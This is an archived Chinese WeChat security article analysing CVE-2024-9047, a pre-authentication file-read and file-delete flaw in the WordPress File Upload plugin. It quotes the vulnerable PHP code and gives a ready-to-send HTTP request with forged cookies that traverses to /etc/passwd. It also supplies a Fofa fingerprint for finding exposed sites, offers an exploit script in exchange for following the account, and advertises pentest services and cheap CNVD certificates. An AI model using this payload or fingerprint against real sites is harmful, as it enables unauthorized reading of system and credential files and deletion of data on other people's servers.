---
cve: "CVE-2024-9047"
source: "gelusus/wxvl 公众号漏洞文库"
---

#  【首发 1day】WordPress File Upload 插件存在前台任意文件读取漏洞(CVE-2024-9047)   
原创 Mstir  星悦安全   2024-12-24 03:54  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/lSQtsngIibibSOeF8DNKNAC3a6kgvhmWqvoQdibCCk028HCpd5q1pEeFjIhicyia0IcY7f2G9fpqaUm6ATDQuZZ05yw/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
点击上方  
蓝字  
关注我们 并设为  
星标  
## 0x00 前言  
  
**WordPress****File Upload 插件，在 <= 4.24.11 版本前的 wfu_file_downloader.php 文件存在前台任意文件读取+任意文件删除漏洞，CVSS评分9.8，Fofa大量存在，且危害较大，没有分析的文章，于是分析一下.**  
  
**影响版本: <= 4.24.11**  
  
**Fofa指纹:"wp-content/plugins/wp-file-upload"**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5erbVnIkcnTFIEZy9wXJARfQ7LMicoRWCYGkdvCmFfxFxGS50v7CydEvnS0fTU48Xaunp2JUiby0Aog/640?wx_fmt=other&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5erbVnIkcnTFIEZy9wXJARfoUrEVTckqok9H4LvCTqLFSI1BhClMLrdk4k8KppeMxjpJdIXjFzlkw/640?wx_fmt=other&from=appmsg "")  
## 0x01 漏洞分析&复现  
  
安装完毕后，位于 /wp-content/plugins/wp-file-upload/wfu_file_downloader.php 中的wfu_fopen_for_downloader 方法存在fopen 函数导致文件读取操作.  
  
```
function wfu_fopen_for_downloader($filepath, $mode) {
  if ( substr($filepath, 0, 7) != "sftp://" ) return @fopen($filepath, $mode);
  $ret = false;
  $ftpinfo = wfu_decode_ftpurl($filepath);
  if ( $ftpinfo["error"] ) return $ret;
  $data = $ftpinfo["data"];
  {
    $conn = @ssh2_connect($data["ftpdomain"], $data["port"]);
    if ( $conn && @ssh2_auth_password($conn, $data["username"], $data["password"]) ) {
      $sftp = @ssh2_sftp($conn);
      if ( $sftp ) {
        //$ret = @fopen("ssh2.sftp://".intval($sftp).$data["filepath"], $mode);
        $contents = @file_get_contents("ssh2.sftp://".intval($sftp).$data["filepath"]);
        $stream = fopen('php://memory', 'r+');
        fwrite($stream, $contents);
        rewind($stream);
        $ret = $stream;
      }
    }
  }
  
  return $ret;
}

```  
  
  
实际在 wfu_download_file 方法就调用到了该函数，且需满足一些条件，其中Cookie中的wfu_storage_pQ1DyzbQp5hBxQpW 为需要读取的文件，包括 wfu_download_ticket_Hw8h7dBmxROx27ZZ 时间戳需要精准在分钟内即可  
  
  
```
<?php
if ( !defined("ABSWPFILEUPLOAD_DIR") ) DEFINE("ABSWPFILEUPLOAD_DIR", dirname(__FILE__).'/');
if ( !defined("WFU_AUTOLOADER_PHP50600") ) DEFINE("WFU_AUTOLOADER_PHP50600", 'vendor/modules/php5.6/autoload.php');
include_once( ABSWPFILEUPLOAD_DIR.'lib/wfu_functions.php' );
include_once( ABSWPFILEUPLOAD_DIR.'lib/wfu_security.php' );
$handler = (isset($_POST['handler']) ? $_POST['handler'] : (isset($_GET['handler']) ? $_GET['handler'] : '-1'));
$session_legacy = (isset($_POST['session_legacy']) ? $_POST['session_legacy'] : (isset($_GET['session_legacy']) ? $_GET['session_legacy'] : ''));
$dboption_base = (isset($_POST['dboption_base']) ? $_POST['dboption_base'] : (isset($_GET['dboption_base']) ? $_GET['dboption_base'] : '-1'));
$dboption_useold = (isset($_POST['dboption_useold']) ? $_POST['dboption_useold'] : (isset($_GET['dboption_useold']) ? $_GET['dboption_useold'] : ''));
$wfu_cookie = (isset($_POST['wfu_cookie']) ? $_POST['wfu_cookie'] : (isset($_GET['wfu_cookie']) ? $_GET['wfu_cookie'] : ''));
if ( $handler == '-1' || $session_legacy == '' || $dboption_base == '-1' || $dboption_useold == '' || $wfu_cookie == '' ) die();
else {
    $GLOBALS["wfu_user_state_handler"] = wfu_sanitize_code($handler);
    $GLOBALS["WFU_GLOBALS"]["WFU_US_SESSION_LEGACY"] = array( "", "", "", ( $session_legacy == '1' ? 'true' : 'false' ), "", true );
    $GLOBALS["WFU_GLOBALS"]["WFU_US_DBOPTION_BASE"] = array( "", "", "", wfu_sanitize_code($dboption_base), "", true );
    $GLOBALS["WFU_GLOBALS"]["WFU_US_DBOPTION_USEOLD"] = array( "", "", "", ( $dboption_useold == '1' ? 'true' : 'false' ), "", true );
    if ( !defined("WPFILEUPLOAD_COOKIE") ) DEFINE("WPFILEUPLOAD_COOKIE", wfu_sanitize_tag($wfu_cookie));
    wfu_download_file();
}

function wfu_download_file() {
    global $wfu_user_state_handler;
    $file_code = (isset($_POST['file']) ? $_POST['file'] : (isset($_GET['file']) ? $_GET['file'] : ''));
    $ticket = (isset($_POST['ticket']) ? $_POST['ticket'] : (isset($_GET['ticket']) ? $_GET['ticket'] : ''));
    if ( $file_code == '' || $ticket == '' ) die();
    
    wfu_initialize_user_state();
    
    $ticket = wfu_sanitize_code($ticket);   
    $file_code = wfu_sanitize_code($file_code);
    //if download ticket does not exist or is expired die
    if ( !WFU_USVAR_exists_downloader('wfu_download_ticket_'.$ticket) || time() > WFU_USVAR_downloader('wfu_download_ticket_'.$ticket) ) {
        WFU_USVAR_unset_downloader('wfu_download_ticket_'.$ticket);
        WFU_USVAR_unset_downloader('wfu_storage_'.$file_code);
        echo 666;
        wfu_update_download_status($ticket, 'failed');
        die();
    }
    //destroy ticket so it cannot be used again
    WFU_USVAR_unset_downloader('wfu_download_ticket_'.$ticket);
    
    //if file_code starts with exportdata, then this is a request for export of
    //uploaded file data, so disposition_name wont be the filename of the file
    //but wfu_export.csv; also set flag to delete file after download operation
    if ( substr($file_code, 0, 10) == "exportdata" ) {
        $file_code = substr($file_code, 10);
        //$filepath = wfu_get_filepath_from_safe($file_code);
        $filepath = WFU_USVAR_downloader('wfu_storage_'.$file_code);
        $disposition_name = "wfu_export.csv";
        $delete_file = true;
    }
    //if file_code starts with debuglog, then this is a request for download of
    //debug_log.txt
    elseif ( substr($file_code, 0, 8) == "debuglog" ) {
        $file_code = substr($file_code, 8);
        //$filepath = wfu_get_filepath_from_safe($file_code);
        $filepath = WFU_USVAR_downloader('wfu_storage_'.$file_code);
        $disposition_name = wfu_basename($filepath);
        $delete_file = false;
    }
    else {
        //$filepath = wfu_get_filepath_from_safe($file_code);
        $filepath = WFU_USVAR_downloader('wfu_storage_'.$file_code);
        if ( $filepath === false ) {
            WFU_USVAR_unset_downloader('wfu_storage_'.$file_code);
            wfu_update_download_status($ticket, 'failed');
            die();
        }
        $filepath = wfu_flatten_path($filepath);
        if ( substr($filepath, 0, 1) == "/" ) $filepath = substr($filepath, 1);
        $filepath = ( substr($filepath, 0, 6) == 'ftp://' || substr($filepath, 0, 7) == 'ftps://' || substr($filepath, 0, 7) == 'sftp://' ? $filepath : WFU_USVAR_downloader('wfu_ABSPATH').$filepath );
        $disposition_name = wfu_basename($filepath);
        $delete_file = false;
    }
    //destroy file code as it is no longer needed
    WFU_USVAR_unset_downloader('wfu_storage_'.$file_code);
    //check that file exists
    if ( !wfu_file_exists_for_downloader($filepath) ) {
        wfu_update_download_status($ticket, 'failed');
        die('<script language="javascript">alert("'.( WFU_USVAR_exists_downloader('wfu_browser_downloadfile_notexist') ? WFU_USVAR_downloader('wfu_browser_downloadfile_notexist') : 'File does not exist!' ).'");</script>');
    }

    $open_session = false;
    @set_time_limit(0); // disable the time limit for this script
    $fsize = wfu_filesize_for_downloader($filepath);
    if ( $fd = wfu_fopen_for_downloader($filepath, "rb") ) {
        $open_session = ( ( $wfu_user_state_handler == "session" || $wfu_user_state_handler == "" ) && ( function_exists("session_status") ? ( PHP_SESSION_ACTIVE !== session_status() ) : ( empty(session_id()) ) ) );
        if ( $open_session ) session_start();
        header('Content-Type: application/octet-stream');
        header("Content-Disposition: attachment; filename=\"".$disposition_name."\"");
        header('Content-Transfer-Encoding: binary');
        header('Connection: Keep-Alive');
        header('Expires: 0');
        header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
        header('Pragma: public');
        header("Content-length: $fsize");
        $failed = false;
        while( !feof($fd) ) {
            $buffer = @fread($fd, 1024*8);
            echo $buffer;
            ob_flush();
            flush();
            if ( connection_status() != 0 ) {
                $failed = true;
                break;
            }
        }
        fclose ($fd);
    }
    else $failed = true;
    
    if ( $delete_file ) wfu_unlink_for_downloader($filepath);
    
    if ( !$failed ) {
        wfu_update_download_status($ticket, 'downloaded');
        if ( $open_session ) session_write_close();
        die();
    }
    else {
        wfu_update_download_status($ticket, 'failed');
        if ( $open_session ) session_write_close();
        die('<script type="text/javascript">alert("'.( WFU_USVAR_exists_downloader('wfu_browser_downloadfile_failed') ? WFU_USVAR_downloader('wfu_browser_downloadfile_failed') : 'Could not download file!' ).'");</script>');
    }
}

```  
  
Payload:  
```
GET /wp-content/plugins/wp-file-upload/wfu_file_downloader.php?file=pQ1DyzbQp5hBxQpW&ticket=Hw8h7dBmxROx27ZZ&handler=dboption&session_legacy=1&dboption_base=cookies&dboption_useold=0&wfu_cookie=wp_wpfileupload_939a4dc9e3d96a97c2dd1bdcbeab52ce HTTP/1.1
Host: 127.0.0.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: wp_wpfileupload_939a4dc9e3d96a97c2dd1bdcbeab52ce=cfyMMnYQqNBbcBNMLTCDnE7ezEAdzLC3; wfu_storage_pQ1DyzbQp5hBxQpW=/../../../../../etc/passwd[[name]]; wfu_download_ticket_Hw8h7dBmxROx27ZZ=时间戳; wfu_ABSPATH=/; 
Connection: close

```  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5erbVnIkcnTFIEZy9wXJARfgaVthDNqmDssrOicCcNuSOYWsyhCzW77ammk26bhaNxtTPibhFuU8BgA/640?wx_fmt=other&from=appmsg "")  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5erbVnIkcnTFIEZy9wXJARfviaLjU0fFqR8BkXfX3GdfI5Q8UYsb8aDdX5xEdZYDONdOuVuibLttSAA/640?wx_fmt=other&from=appmsg "")  
  
**利用脚本**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5erbVnIkcnTFIEZy9wXJARfAZKgUcxBtibiaRW5Nia6QKLpvll52cPfPWwFOrzSRNGE07DaHwRKQLVFQ/640?wx_fmt=png&from=appmsg "")  
## 0x02 脚本下载  
  
**标签:代码审计，0day，渗透测试，系统，通用，0day，闲鱼，转转**  
  
**利用脚本关注公众号发送 241224 获取!**  
  
  
  
  
  
****  
**进公开群，代码审计，众测，驻场，渗透测试，攻防演练，CNVD证书全网最低价+VX: Lonely3944**  
  
****  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/uicic8KPZnD5erbVnIkcnTFIEZy9wXJARfhbPBGic08dIfyq6cCbZdhlLkQETGMqZfcZ4FxH5meYTWZAReibE9ZZcA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/uicic8KPZnD5erbVnIkcnTFIEZy9wXJARfGm5tc2via1EPictNibZVv7KiaQ3fIQQzxTaJibWDFmw6QaNzYicxTR3ye93g/640?wx_fmt=jpeg "")  
  
**免责声明:****文章中涉及的程序(方法)可能带有攻击性，仅供安全研究与教学之用，读者将其信息做其他用途，由读者承担全部法律及连带责任，文章作者和本公众号不承担任何法律及连带责任，望周知！！!**  
  


---

> 来源：gelusus/wxvl（微信公众号漏洞文章自动归档，原文见文首链接）
